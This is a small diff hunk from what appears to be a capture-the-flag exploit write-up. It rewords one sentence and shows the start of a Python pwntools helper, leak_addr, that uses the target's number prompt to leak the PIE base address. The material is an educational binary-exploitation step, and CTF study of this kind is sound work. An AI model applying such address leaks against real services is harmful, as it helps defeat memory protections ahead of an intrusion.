@@ -52,7 +52,7 @@ __int64 __fastcall are_you_sure(unsigned int num)
 }
 ```
 
-We can leak the PIE base using this leak function:
+We can leak the PIE base using this code:
 ```python
 def leak_addr(number):
     io.sendlineafter("do you have any number in mind ??", str(number))
